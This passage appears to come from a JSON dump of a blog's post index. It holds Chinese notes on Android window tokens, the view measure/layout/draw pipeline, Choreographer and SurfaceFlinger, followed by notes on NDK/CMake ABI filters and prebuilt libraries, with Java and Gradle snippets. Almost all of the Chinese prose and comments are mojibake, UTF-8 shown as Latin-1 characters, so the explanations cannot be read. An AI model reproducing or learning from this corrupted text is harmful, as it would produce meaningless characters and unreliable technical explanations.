l);è¿™ä¸ªmWindowManagerå…¶å®å·²ç»æ˜¯Activityçš„mWindowManageräº†ã€‚æ‰€ä»¥å¯¹è¿™ä¸ªmWindowManager(å†…éƒ¨ç”¨mParentWindowï¼Œå³Activityçš„window)è°ƒç”¨addViewæ–¹æ³•ã€‚åœ¨WindowManagerGlobalçš„addViewä¸­æœ‰adjustLayoutParamsForSubWindowè¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œæœ€é‡è¦çš„å°±æ˜¯ç»™WindowManager.LayoutParams.tokenèµ‹å€¼ã€‚mWindowManager.addView(mDecor, l); -&gt; WindowManagerGlobal.addView -&gt; Window.adjustLayoutParamsForSubWindow(å°±æ˜¯åœ¨è¿™é‡Œä»Activityçš„windowä¸­å–å‡ºtokenèµ‹å€¼ç»™layoutParamsçš„) WindowManager.LayoutParamsä¸­æœ‰ä¸‰ç§çª—å£ç±»å‹type åº”ç”¨ç¨‹åºçª—å£ï¼šFIRST_APPLICATION_WINDOW - LAST_APPLICATION_WINDOW (1-99)ã€‚ Activityçš„window,Dialogçš„window å­çª—å£: FIRST_SUB_WINDOW - LAST_SUB_WINDOW (1000-1999). ä¾‹å¦‚PopupWindowï¼ŒContextMenuï¼ŒoptionMenuã€‚å­çª—å£å¿…é¡»è¦æœ‰ä¸€ä¸ªçˆ¶çª—å£ï¼Œçˆ¶çª—å£å¯ä»¥æ˜¯åº”ç”¨ç¨‹åºçª—å£ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä»»æ„ç±»å‹ã€‚çˆ¶çª—å£çš„ä¸å¯è§æ—¶ï¼Œå­çª—å£ä¸å¯è§ ç³»ç»Ÿçª—å£: FIRST_SYSTEM_WINDOW - LAST_SYSTEM_WINDOW (2000 -2999) Toastï¼Œè¾“å…¥æ³•ç­‰ç­‰ã€‚ç³»ç»Ÿçª—å£ä¸éœ€è¦å¯¹åº”Activityï¼Œæ¯”å¦‚TYPE_SYSTEM_ALERTï¼ŒçŠ¶æ€æ ï¼Œæ¥ç”µæ˜¾ç¤ºï¼Œå±ä¿ç­‰ // Window.java å½“å‰å®ä¾‹æ˜¯Activityçš„PhoneWindowï¼Œå…¶æˆå‘˜å˜é‡mAppTokenåœ¨activityçš„attachä¸­å°±åˆå§‹åŒ–äº†ï¼Œdebugå‘ç°æ˜¯BinderProxyå®ä¾‹ void adjustLayoutParamsForSubWindow(WindowManager.LayoutParams wp) { if (wp.type &gt;= WindowManager.LayoutParams.FIRST_SUB_WINDOW &amp;&amp; wp.type &lt;= WindowManager.LayoutParams.LAST_SUB_WINDOW) { //1000-1999 // if (wp.token == null) { View decor = peekDecorView(); if (decor != null) { wp.token = decor.getWindowToken();//ä»mAttachInfo.mWindowTokenè·å– } } } else if (wp.type &gt;= WindowManager.LayoutParams.FIRST_SYSTEM_WINDOW &amp;&amp; wp.type &lt;= WindowManager.LayoutParams.LAST_SYSTEM_WINDOW) { //ç³»ç»Ÿwindow 2000-2999 } else { //dialogçš„typeå› ä¸ºæ˜¯2ï¼Œæ‰€ä»¥èµ°åˆ°è¿™é‡Œ if (wp.token == null) { wp.token = mContainer == null ? mAppToken : mContainer.mAppToken;//Dialogä¼šèµ°åˆ°è¿™é‡Œï¼ŒmAppTokenä¸ä¸ºnull } } } PopupWindow(æ²¡æœ‰åˆ›å»ºwindow)//popupwindowçš„LayoutParams.typeé»˜è®¤æ˜¯ private int mWindowLayoutType = WindowManager.LayoutParams.TYPE_APPLICATION_PANEL;// 1000 //å¯ä»¥ä¿®æ”¹çš„ //PopupWindow.java public void showAsDropDown(View anchor, int xoff, int yoff, int gravity) { final WindowManager.LayoutParams p = createPopupLayoutParams(anchor.getApplicationWindowToken()); } public void showAtLocation(View parent, int gravity, int x, int y) { mParentRootView = new WeakReference&lt;&gt;(parent.getRootView()); showAtLocation(parent.getWindowToken(), gravity, x, y); } å¯ä»¥å‘ç°æ— è®ºæ˜¯showAsDropDownè¿˜æ˜¯showAtLocationå…¨éƒ½æ˜¯éœ€è¦ä»anchorViewæ‹¿åˆ°windowTokençš„ private void invokePopup(WindowManager.LayoutParams p) { mWindowManager.addView(decorView, p); //è¿™æ—¶å€™çš„på·²ç»å¡«å……äº†token } Toastç”¨IPCå¾€NotificationManagerServiceçš„ä¸€ä¸ªé˜Ÿåˆ—ä¸­æ·»åŠ ä¸€ä¸ªrunnableï¼Œç³»ç»Ÿå…¨å±€æ‰€æœ‰åº”ç”¨çš„Toastè¯·æ±‚éƒ½è¢«æ·»åŠ åˆ°è¿™é‡Œï¼Œæ’é˜Ÿï¼Œä¸€ä¸ªä¸ªæ¥ï¼Œè¿œç¨‹å†å›è°ƒappè¿›ç¨‹çš„Toast.TN(extends ITransientNotification.Stub)çš„handleShowæ–¹æ³•å»æ·»åŠ ä¸€ä¸ªtypeä¸ºWindowManager.LayoutPrams.TYPE_TOASTçš„viewã€‚å½“ç„¶ï¼Œæ—¶é—´åˆ°äº†è¿œç¨‹è¿˜ä¼šå›è°ƒcancelToastå»ç”¨WMSç§»é™¤Viewã€‚ doTraversalViewRootImplä¸­çš„doTraversalå¯ä»¥åˆ†æˆä¸‰ä»¶äº‹ mView.performMeasuremView.performLayoutmView.performDraw è¿™é‡Œçš„mViewä¹Ÿå°±æ˜¯DecorViewäº† measure//onMeasureé‡Œçš„ä¸¤ä¸ªå‚æ•°witdthMeasureSpecå’ŒheightMeasureSpecæ˜¯æ€ä¹ˆæ¥çš„ @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { } //ViewGroup.javaä¸­æœ‰è¿™ä¹ˆä¸€æ®µ protected void measureChildWithMargins(View child, int parentWidthMeasureSpec, int widthUsed, int parentHeightMeasureSpec, int heightUsed) { final MarginLayoutParams lp = (MarginLayoutParams) child.getLayoutParams(); final int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, mPaddingLeft + mPaddingRight + lp.leftMargin + lp.rightMargin + widthUsed, lp.width); final int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, mPaddingTop + mPaddingBottom + lp.topMargin + lp.bottomMargin + heightUsed, lp.height); child.measure(childWidthMeasureSpec, childHeightMeasureSpec); } //ViewGroup.java public static int getChildMeasureSpec(int spec, int padding, int childDimension) { //è¿™ä¸ªchildDimensionå°±æ˜¯lp.widthæˆ–è€…lp.height int specMode = MeasureSpec.getMode(spec); int specSize = MeasureSpec.getSize(spec); int size = Math.max(0, specSize - padding); //æ‰€ä»¥è¿™ä¸ªsizeå°±æ˜¯å½“å‰è¿™ä¸ªviewGroupçš„measureSpecä¸­çš„size-viewgroupçš„padding-child.lp.marginä¹‹åçš„å€¼ int resultSize = 0; int resultMode = 0; switch (specMode) { // Parent has imposed an exact size on us case MeasureSpec.EXACTLY: if (childDimension &gt;= 0) { //å¦‚æœè‡ªå·±æ˜¯EXACTLYï¼Œchildçš„lp.widthæˆ–è€…lp.height&gt;0çš„è¯ï¼Œç”Ÿæˆä¸€ä¸ªsizeä¸ºdimensionåªï¼Œmodeä¸ºEXACTLYçš„ spec resultSize = childDimension; resultMode = MeasureSpec.EXACTLY; } else if (childDimension == LayoutParams.MATCH_PARENT) { // Child wants to be our size. So be it. resultSize = size; resultMode = MeasureSpec.EXACTLY; } else if (childDimension == LayoutParams.WRAP_CONTENT) { // Child wants to determine its own size. It can&#39;t be // bigger than us. resultSize = size; resultMode = MeasureSpec.AT_MOST; } break; // Parent has imposed a maximum size on us case MeasureSpec.AT_MOST: if (childDimension &gt;= 0) { // Child wants a specific size... so be it resultSize = childDimension; resultMode = MeasureSpec.EXACTLY; } else if (childDimension == LayoutParams.MATCH_PARENT) { // Child wants to be our size, but our size is not fixed. // Constrain child to not be bigger than us. resultSize = size; resultMode = MeasureSpec.AT_MOST; } else if (childDimension == LayoutParams.WRAP_CONTENT) { // Child wants to determine its own size. It can&#39;t be // bigger than us. resultSize = size; resultMode = MeasureSpec.AT_MOST; } break; return MeasureSpec.makeMeasureSpec(resultSize, resultMode); } layoutè¿™é‡Œå°±æ˜¯è°ƒç”¨onLayoutæ–¹æ³•äº†ï¼ŒFrameLayoutä¼šæ ¹æ®childçš„Gravityæ¨ªå‘æˆ–è€…çºµå‘æ‘†æ”¾ã€‚LinearLayoutä¼šæ ¹æ®è‡ªå·±çš„orientationï¼Œä»ä¸Šåˆ°ä¸‹æˆ–è€…ä»å·¦åˆ°å³è¿›è¡Œæ‘†æ”¾ã€‚ drawpublic void draw(Canvas canvas) { . . . // ç»˜åˆ¶èƒŒæ™¯ï¼Œåªæœ‰dirtyOpaqueä¸ºfalseæ—¶æ‰è¿›è¡Œç»˜åˆ¶ï¼Œä¸‹åŒ int saveCount; if (!dirtyOpaque) { drawBackground(canvas); } . . . // ç»˜åˆ¶è‡ªèº«å†…å®¹ if (!dirtyOpaque) onDraw(canvas); // ç»˜åˆ¶å­View dispatchDraw(canvas); . . . // ç»˜åˆ¶æ»šåŠ¨æ¡ç­‰ onDrawForeground(canvas); } drawçš„åŸºæœ¬æµç¨‹æ˜¯è¿™æ ·ï¼Œè¿™ä¸ªcanvasæ˜¯ViewRootImplä¸­çš„canvas = mSurface.lockCanvas(dirty);è·å¾—çš„ã€‚ä¸ªäººç†è§£Canvasæ˜¯å­˜å‚¨äº†ä¸€ç³»åˆ—çš„æŒ‡ä»¤ï¼Œå†äº¤ç»™surface ChoregrapherChoregrapheré‡Œé¢æœ‰ä¸€ä¸ªå†…éƒ¨ç±»FrameDisplayEventReceiver(ç»§æ‰¿è‡ªDisplayEventReceiverï¼ŒDisplayEventReceiveræ˜¯ä¸€ä¸ªæ²¡æœ‰æŠ½è±¡æ–¹æ³•çš„æŠ½è±¡ç±»)ï¼Œä¸»è¦æä¾›ä¸¤ä¸ªæ–¹æ³•nativeScheduleVsyncå’ŒonVsyncã€‚FrameDisplayEventReceiveråœ¨onVsyncçš„æ—¶å€™ä¼špostä¸€ä¸ªå¼‚æ­¥(ä¹Ÿå°±æ˜¯è¯´ä¸å—syncBarrieré˜»æ‹¦)çš„æ¶ˆæ¯åˆ°ä¸»çº¿ç¨‹ä¸Šå»è°ƒç”¨Choregrapherçš„doFrameï¼ˆè¿™é‡Œé¢å°±æ˜¯æŠŠä¹‹å‰æ‰€æœ‰é€šè¿‡Choregrapher.postCallbackæ·»åŠ åˆ°é˜Ÿåˆ—çš„äº‹ä»¶æ‹¿å‡ºæ¥ï¼Œåˆ°æœŸäº†å°±æ‰§è¡Œï¼‰ ä¸»çº¿ç¨‹çš„MessageQueueè¢«syncBarrierå µä½çš„æ˜¾è‘—ç‰¹å¾æ˜¯msg.target==null(ä¹Ÿå°±æ˜¯å¯¹åº”çš„handlerä¸ºnull). ViewRootImplåœ¨scheduleTraversalsçš„æ—¶å€™ä¼špostSyncBarrierä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªdoTraversalæ˜¯é«˜ä¼˜å…ˆçº§çš„ï¼Œè¿™ä¸€åˆ»èµ·åé¢çš„æ‰€æœ‰ä¸¢åˆ°ä¸»çº¿ç¨‹ä¸Šçš„msgéƒ½è¦ç­‰åˆ°æˆ‘doTraversalå®Œæˆåæ‰æ‰§è¡Œ(å¼‚æ­¥æ¶ˆæ¯ä¾‹å¤–ï¼Œæ‰€ä»¥ä¸Šé¢onVsyncçš„æ¶ˆæ¯å¾—æ˜¯å¼‚æ­¥çš„)ã€‚ä»æ—¶é—´é¡ºåºä¸Šæ¥è®²ï¼ŒViewRootImpl.scheduleTraversal -&gt; mChoreographer.postCallback -&gt; Choreographerå¼€å§‹scheduleFrameLockedï¼ˆå‡å¦‚æ—¶é—´åˆ°äº†ï¼Œç›´æ¥è°ƒç”¨nativeScheduleVsyncï¼Œå¦åˆ™å‘é€çš„msgå…¨éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œå°±æ˜¯ä¸ºäº†è·¨è¿‡ä¹‹å‰çš„barrier.ï¼‰åŒæ ·ï¼Œåœ¨onVsyncçš„æ—¶å€™ï¼Œç”±äºæ­¤æ—¶çš„barrierè¿˜æ²¡ç§»é™¤ï¼Œæ‰€ä»¥å‘å‡ºçš„æ¶ˆæ¯è¿˜å¾—æ˜¯å¼‚æ­¥çš„ã€‚doFrameé‡Œé¢ï¼Œä¸¥æ ¼æŒ‰ç…§input -&gt; animation -&gt; traversalçš„ç±»å‹å»æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯viewRootImplåœ¨scheduleTraversalsçš„æ—¶å€™postçš„callbackè¦è€è€å®å®åœ¨ç¬¬ä¸‰ç»„è¢«æ‰§è¡Œã€‚è€Œåœ¨è½®åˆ°è¿™ä¸ªdoTraversalæ‰§è¡Œçš„æ—¶å€™ï¼Œç»ˆäºå¯ä»¥å»ç§»é™¤barrieräº†ã€‚ éœ€è¦æŒ‡æ˜çš„æ˜¯ï¼Œæ¯ä¸€æ¬¡scheduleTraversaléƒ½è¦è§¦å‘measure -&gt; layout -&gt; drawè¿™ä¸€å¥—ï¼Œæ‰€ä»¥ï¼Œè€—æ—¶æ˜¯å¾ˆä¸¥é‡çš„ã€‚vsyncä¿¡å·ä¹Ÿä¸æ˜¯ç³»ç»Ÿä¸»åŠ¨å‘å‡ºçš„ï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡nativeScheduleVsyncè¯·æ±‚ï¼Œæ‰ä¼šæœ‰ä¸€æ¬¡onVsyncçš„ç›¸åº”çš„ã€‚çœ‹äº†ä¸€ä¸‹ï¼ŒViewRootImplé‡Œé¢çš„setLayoutParamsï¼Œinvalidate,requestLayout,requestFitSystemWindowsç­‰æ–¹æ³•é‡Œé¢éƒ½ä¼šè§¦å‘scheduleTraversalã€‚ æ˜¾ç„¶åœ¨onCreateçš„setContentViewé‡Œé¢ä¼šè‡³å°‘è°ƒç”¨ä¸€æ¬¡ã€‚ç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„performTraversal(measure,layout,draw)ã€‚ äººä»¬å¸¸è¯´åœ¨onCreateé‡Œé¢è·å–ä¸€ä¸ªViewçš„å®½é«˜æœ‰å››ç§æ–¹å¼ï¼šonPreDraw,onLayoutChange,view.measure.ç¬¬å››ç§å°±æ˜¯ç›´æ¥åœ¨setContentViewåé¢è·Ÿç€postä¸€ä¸ªmsgï¼ŒåŸç†å°±æ˜¯å‰é¢æœ‰ä¸€ä¸ªbarrierï¼Œè¿™ä¸ªbarrierè§£é™¤ä¹‹åæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªmsgå¤§æ¦‚ç‡å°±æ˜¯è¿™ä¸ªmsg(ä¸è€ƒè™‘åˆ«çš„çº¿ç¨‹è¿™ä¹ˆå·§ä¹Ÿæ’è¿›æ¥)ï¼Œè¿™æ—¶å€™ï¼ŒperformTraversalsåˆšåˆšèµ°å®Œï¼Œdrawä¹Ÿèµ°å®Œäº†,æœ€åç»˜åˆ¶æ•°æ®éƒ½ç¼“å­˜åˆ°Surfaceä¸Šã€‚ä½†æ˜¯systemServeré‚£è¾¹ï¼ŒwindowManagerServiceå’ŒsurfaceFlingeré‚£è¾¹è¿˜æ²¡æ¥å¾—åŠå¤„ç†è¿™äº›åˆšdrawçš„æ•°æ®ï¼ˆsurfaceFlingeré‚£è¾¹è¿˜è¦composeï¼Œæ²¡é‚£ä¹ˆå¿«å§ï¼‰ã€‚ surfaceFlingerAndroidæ˜¯é€šè¿‡ç³»ç»Ÿçº§è¿›ç¨‹ä¸­çš„SurfaceFlingeræœåŠ¡æ¥æŠŠçœŸæ­£éœ€è¦æ˜¾ç¤ºçš„æ•°æ®æ¸²æŸ“åˆ°å±å¹•ä¸Šã€‚SurfaceFlingerçš„ä¸»è¦å·¥ä½œæ˜¯ï¼šå“åº”å®¢æˆ·ç«¯äº‹ä»¶ï¼Œåˆ›å»ºLayerä¸å®¢æˆ·ç«¯çš„Surfaceå»ºç«‹è¿æ¥ã€‚æ¥æ”¶å®¢æˆ·ç«¯æ•°æ®åŠå±æ€§ï¼Œä¿®æ”¹Layerå±æ€§ï¼Œå¦‚å°ºå¯¸ã€é¢œè‰²ã€é€æ˜åº¦ç­‰ã€‚å°†åˆ›å»ºçš„Layerå†…å®¹åˆ·æ–°åˆ°å±å¹•ä¸Šã€‚ç»´æŒLayerçš„åºåˆ—ï¼Œå¹¶å¯¹Layeræœ€ç»ˆè¾“å‡ºåšå‡ºè£å‰ªè®¡ç®—ã€‚å› åº”ç”¨å±‚å’Œç³»ç»Ÿå±‚åˆ†åˆ«æ˜¯ä¸¤ä¸ªä¸åŒè¿›ç¨‹ï¼Œéœ€è¦ä¸€ä¸ªè·¨è¿›ç¨‹çš„é€šä¿¡æœºåˆ¶æ¥å®ç°æ•°æ®ä¼ è¾“ï¼Œåœ¨Androidçš„æ˜¾ç¤ºç³»ç»Ÿä¸­ï¼Œä½¿ç”¨äº†Androidçš„åŒ¿åå…±äº«å†…å­˜ï¼šSharedClientã€‚æ¯ä¸€ä¸ªåº”ç”¨å’ŒSurfaceFlingerä¹‹é—´éƒ½ä¼šåˆ›å»ºä¸€ä¸ªSharedClientï¼Œæ¯ä¸ªSharedClientä¸­ï¼Œæœ€å¤šå¯ä»¥åˆ›å»º31ä¸ªSharedBufferStackï¼Œæ¯ä¸ªSurfaceéƒ½å¯¹åº”ä¸€ä¸ªSharedBufferStackï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªwindowã€‚è¿™æ„å‘³ç€ä¸€ä¸ªAndroidåº”ç”¨ç¨‹åºæœ€å¤šå¯ä»¥åŒ…å«31ä¸ªçª—å£ï¼ŒåŒæ—¶æ¯ä¸ªSharedBufferStackä¸­åˆåŒ…å«ä¸¤ä¸ª(&lt;4.1)æˆ–ä¸‰ä¸ª(&gt;=4.1)ç¼“å†²åŒºã€‚åº”ç”¨å±‚ç»˜åˆ¶åˆ°ç¼“å†²åŒºï¼ŒSurfaceFlingeræŠŠç¼“å­˜åŒºæ•°æ®æ¸²æŸ“åˆ°å±å¹•ï¼Œä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´ä½¿ç”¨Androidçš„åŒ¿åå…±äº«å†…å­˜SharedClientç¼“å­˜éœ€è¦æ˜¾ç¤ºçš„æ•°æ®ã€‚ WMSè·ŸsurfaceFlingeräº¤äº’çš„è¿‡ç¨‹æ˜¯ï¼ŒWMSå»ºç«‹SurfaceComposerClientï¼Œç„¶åä¼šåœ¨SFä¸­åˆ›å»ºClientä¸ä¹‹å¯¹åº”ï¼Œåç»­é€šè¿‡ISurfaceComposerClientä¸SFé€šä¿¡ APPå¯ä»¥æ²¡æœ‰Activty,PhoneWindow,DecorViewï¼Œä¾‹å¦‚å¸¦æ‚¬æµ®çª—çš„serviceã€‚ å‚è€ƒå›¾ç‰‡å‡ºè‡ªBuglyæ·±å…¥ç†è§£Androidä¹‹Viewçš„ç»˜åˆ¶æµç¨‹","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"ndkå…¥é—¨ç¬”è®°","date":"2019-02-13T18:25:01.000Z","path":"2019/02/13/2019-02-13-ndk-related-topics/","text":"androidä¸­ndkåŠjniç¼–å†™æ³¨æ„äº‹é¡¹ï¼ˆæœ¬æ–‡ä¸»è¦è®²CMakeï¼‰ä¸€äº›å°çªé—¨ cmakeæœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢.externalNativeBuild/cmake/debug/{abi}/cmake_build_command.txtcmakeç”Ÿæˆçš„.soæ–‡ä»¶åœ¨â€\\app\\build\\intermediates\\cmake\\debug\\obj\\arm64-v8aâ€è¿™ä¸ªè·¯å¾„ä¸‹ã€‚CMake ä¸€å…±æœ‰2ç§ç¼–è¯‘å·¥å…·é“¾ - clang å’Œ gccï¼Œgcc å·²ç»åºŸå¼ƒï¼Œclang æ˜¯é»˜è®¤çš„ã€‚ ndkå®˜æ–¹å…¥é—¨æŒ‡å— cpuæ¶æ„ armeabi armeabiÂ­v7a arm64Â­v8a x86 x86_64 mips mips64 cmakeäº¤å‰ç¼–è¯‘ abi(application binary interface)abisndkæ”¯æŒçš„abiåŒ…æ‹¬armeabiï¼Œarmeabi-v7aï¼Œarm64-v8aï¼Œx86ï¼Œx86_64ï¼Œmipsï¼Œmips64 NDK 17 ä¸å†æ”¯æŒ ABI: armeabiã€mipsã€mips64 x86è®¾å¤‡ä¸Šï¼Œlibs/x86ç›®å½•ä¸­å¦‚æœå­˜åœ¨.soæ–‡ä»¶çš„è¯ï¼Œä¼šè¢«å®‰è£…ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä¼šé€‰æ‹©armeabi-v7aä¸­çš„.soæ–‡ä»¶ï¼Œå¦‚æœä¹Ÿä¸å­˜åœ¨ï¼Œåˆ™é€‰æ‹©armeabiç›®å½•ä¸­çš„.soæ–‡ä»¶ã€‚ x86è®¾å¤‡èƒ½å¤Ÿå¾ˆå¥½çš„è¿è¡ŒARMç±»å‹å‡½æ•°åº“ï¼Œä½†å¹¶ä¸ä¿è¯100%ä¸å‘ç”Ÿcrashï¼Œç‰¹åˆ«æ˜¯å¯¹æ—§è®¾å¤‡ã€‚ 64ä½è®¾å¤‡ï¼ˆarm64-v8a, x86_64, mips64ï¼‰èƒ½å¤Ÿè¿è¡Œ32ä½çš„å‡½æ•°åº“ï¼Œä½†æ˜¯ä»¥32ä½æ¨¡å¼è¿è¡Œï¼Œåœ¨64ä½å¹³å°ä¸Šè¿è¡Œ32ä½ç‰ˆæœ¬çš„ARTå’ŒAndroidç»„ä»¶ï¼Œå°†ä¸¢å¤±ä¸“ä¸º64ä½ä¼˜åŒ–è¿‡çš„æ€§èƒ½ï¼ˆARTï¼Œwebviewï¼Œmediaç­‰ç­‰ï¼‰ã€‚æ‰€æœ‰çš„x86/x86_64/armeabi-v7a/arm64-v8aè®¾å¤‡éƒ½æ”¯æŒarmeabiæ¶æ„çš„.soæ–‡ä»¶ï¼Œå› æ­¤ä¼¼ä¹ç§»é™¤å…¶ä»–ABIsçš„.soæ–‡ä»¶æ˜¯ä¸€ä¸ªå‡å°‘APKå¤§å°çš„å¥½æŠ€å·§ã€‚ abiFilteråªæƒ³è®©cmakeæ‰“arm64-v8aä¸€ç§archçš„åŒ…æ€ä¹ˆåŠ In most cases, you only need to specify abiFilters in the ndk block, as shown above, because it tells Gradle to both build and package those versions of your native libraries. However, if you want to control what Gradle should build, independently of what you want it to package into your APK, configure another abiFilters flag in the defaultConfig.externalNativeBuild.cmake block (or defaultConfig.externalNativeBuild.ndkBuild block). Gradle builds those ABI configurations but only packages the ones you specify in the defaultConfig.ndk block. ç¿»è¯‘è¿‡æ¥å°±æ˜¯ android { ... defaultConfig { ... externalNativeBuild { cmake { abiFilters &quot;arm64-v8a&quot; //åªå¸®æˆ‘æ‰“è¿™ä¸ªæ¶æ„çš„å°±å¥½äº† } // or ndkBuild {...} } // Similar to other properties in the defaultConfig block, // you can configure the ndk block for each product flavor // in your build configuration. ndk { // Specifies the ABI configurations of your native // libraries Gradle should build and package with your APK. abiFilters &#39;x86&#39;, &#39;x86_64&#39;, &#39;armeabi&#39;, &#39;armeabi-v7a&#39;, &#39;arm64-v8a&#39; //è¿™äº›æ¶æ„çš„åŒ…æˆ‘å…¨éƒ¨éƒ½è¦æ‰“è¿›apké‡Œé¢ //å½“ç„¶ï¼Œå¦‚æœ externalNativeBuildé‡Œé¢åªæ‰“äº†arm64-v8açš„soæ–‡ä»¶ï¼Œè¿™ç§å†™æ³•å¯¼è‡´æœ€ç»ˆç”Ÿæˆçš„apké‡Œé¢è£…äº†x86ï¼Œx86_64..çš„soæ–‡ä»¶å¤¹ï¼Œä½†å…¶å®é‡Œé¢æ”¾çš„éƒ½æ˜¯arm64-v8açš„soï¼Œå½“ç„¶æ˜¯ä¸è¡Œçš„ã€‚ //é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å†™abiFilterçš„è¯ï¼Œæ‰€æœ‰æ”¯æŒçš„abiå¯¹åº”çš„soæ–‡ä»¶éƒ½ä¼šæ‰“å‡ºæ¥ï¼Œå¤§å°ç•¥æœ‰å·®å¼‚ } } buildTypes {...} // Use this block to link Gradle to your CMake or ndk-build script.ä¼¼ä¹åªæ˜¯ç”¨æ¥å‘Šè¯‰gradle CMakeList.txtçš„ä½ç½®åœ¨å“ªé‡Œ externalNativeBuild { cmake { path &#39;CMakeLists.txt&#39; //è¿™ä¸ªæ˜¯è¯´æ˜CMakeLists.txtè¿™ä¸ªæ–‡ä»¶åœ¨å“ªé‡Œçš„ï¼Œstudio é‡Œé¢link project with c++ programå°±æ˜¯å¹²è¿™ä¸ªçš„ //ä¸‹é¢è¿™äº›æ˜¯ä¸ºäº†è¯´æ˜å¯ä»¥é€šè¿‡gradleå¾€cmakeä¼ ä¸€äº›command line argumentsçš„ã€‚ // Passes optional arguments to CMake. arguments &quot;-DANDROID_ARM_NEON=TRUE&quot;, &quot;-DANDROID_TOOLCHAIN=clang&quot; // Sets a flag to enable format macro constants for the C compiler. cFlags &quot;-D__STDC_FORMAT_MACROS&quot; // Sets optional flags for the C++ compiler. cppFlags &quot;-fexceptions&quot;, &quot;-frtti&quot; // Specifies the library and executable targets from your CMake project // that Gradle should build. targets &quot;libexample-one&quot;, &quot;my-executible-demo&quot; } } } æ‰€ä»¥ç°åœ¨çœ‹æ¥è¿™ç§æ‰‹åŠ¨è°ƒç”¨cmakeçš„æ–¹å¼ä¹Ÿæ²¡æœ‰å¤ªå¤§å¿…è¦äº† abiæ”¯æŒç¼ºå¤±å¯¼è‡´çš„crashandroidç¬¬ä¸‰æ–¹ sdkæ˜¯ä»¥aarå½¢å¼æä¾›çš„,ç”šè‡³æ˜¯è¿œç¨‹aarï¼Œå¦‚æœè¿™ä¸ªsdkå¯¹abiçš„æ”¯æŒæ¯”è¾ƒå…¨ï¼Œå¯èƒ½ä¼šåŒ…å«armeabi, armeabi-v7a,x86, arm64-v8a,x86_64äº”ç§abi,è€Œä½ åº”ç”¨çš„å…¶å®ƒsoåªæ”¯æŒarmeabi,armeabi-v7aï¼Œx86ä¸‰ç§ï¼Œç›´æ¥å¼•ç”¨sdkçš„aar,ä¼šè‡ªåŠ¨ç¼–è¯‘å‡ºæ”¯æŒ5ç§abiçš„åŒ…ã€‚ä½†æ˜¯åº”ç”¨çš„å…¶å®ƒsoç¼ºå°‘å¯¹å…¶å®ƒä¸¤ç§abiçš„æ”¯æŒï¼Œé‚£ä¹ˆå¦‚æœåº”ç”¨è¿è¡Œäºarm64-v8a,x86_64ä¸ºé¦–é€‰abiçš„è®¾å¤‡ä¸Šæ—¶ï¼Œå°±ä¼šCRASHã€‚æ‰€ä»¥è§£å†³æ–¹æ³•å°±åˆ†ä¸¤ç§ç¬¬ä¸€ç§ï¼š productFlavors { necess { ndk { abiFilters &quot;armeabi-v7a&quot; abiFilters &quot;x86&quot; abiFilters &quot;armeabi&quot; } } abiall { ndk { abiFilters &quot;armeabi-v7a&quot; abiFilters &quot;x86&quot; abiFilters &quot;armeabi&quot; abiFilters &quot;arm64-v8a&quot; abiFilters &quot;x86_64&quot; } } } ç¬¬äºŒç§ï¼šapp/build.gradleä¸­è¿™å¥è¯çš„æ„æ€æ˜¯æŒ‡è®©ç”Ÿæˆçš„apkä¸­åŒ…å«ä¸‹é¢ä¸‰ç§abiçš„soæ–‡ä»¶ defaultConfig { ndk { abiFilters &quot;armeabi&quot;, &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot; } } åœ¨apkæ–‡ä»¶ä¸­ï¼Œsoæ–‡ä»¶æ”¾åœ¨lib/armeabi-v7a lib/x86_64 lib/x86 lib/arm64-v8aè¿™äº›æ–‡ä»¶å¤¹ä¸‹é¢ æ·»åŠ prebuilt libraryAdd other prebuilt librariesåœ¨CMakeLists.txtä¸­æ·»åŠ add_library( imported-lib SHARED IMPORTED )å…³é”®è¯IMPORTED ï¼Œå°±æ‹¿ffmepgæ¥è¯´ï¼Œé¦–å…ˆåœ¨linuxä¸Šç¼–è¯‘å‡ºä¸åŒabiçš„soæ–‡ä»¶ï¼Œffmpegæœ‰å¥½å‡ ä¸ªsoæ–‡ä»¶ï¼Œæ¯”æ–¹è¯´libavcodec.soè¿™ä¸ªæ–‡ä»¶ã€‚ Some libraries provide separate packages for specific CPU architectures, or Application Binary Interfaces (ABI), and organize them into separate directories. This approach helps libraries take advantage of certain CPU architectures while allowing you to use only the versions of the library you want. To add multiple ABI versions of a library to your CMake build script, without having to write multiple commands for each version of the library, you can use the ANDROID_ABI path variable. This variable uses a list of the default ABIs that the NDK supports, or a filtered list of ABIs you manually configure Gradle to use. æœ‰äº›ç¬¬ä¸‰æ–¹åº“é’ˆå¯¹ä¸åŒçš„cpuæ¶æ„æä¾›äº†ä¸åŒçš„soæ–‡ä»¶ # æ·»åŠ åº“â€”â€”å¤–éƒ¨å¼•å…¥çš„åº“ # åº“åç§°ï¼šavcodecï¼ˆä¸éœ€è¦åŒ…å«å‰ç¼€libï¼‰ # åº“ç±»å‹ï¼šSHAREDï¼Œè¡¨ç¤ºåŠ¨æ€åº“ï¼Œåç¼€ä¸º.soï¼ˆå¦‚æœæ˜¯STATICï¼Œåˆ™è¡¨ç¤ºé™æ€åº“ï¼Œåç¼€ä¸º.aï¼‰ # IMPORTEDè¡¨æ˜æ˜¯å¤–éƒ¨å¼•å…¥çš„åº“ set(distribution_DIR ../../../../libs) //è¿™ä¸ªlibsæ–‡ä»¶å¤¹åå­—éšä¾¿å–ï¼Œä¸‹é¢è¦åŒ…å«armeabi-v7a,x86,x86_64ç­‰ä½ 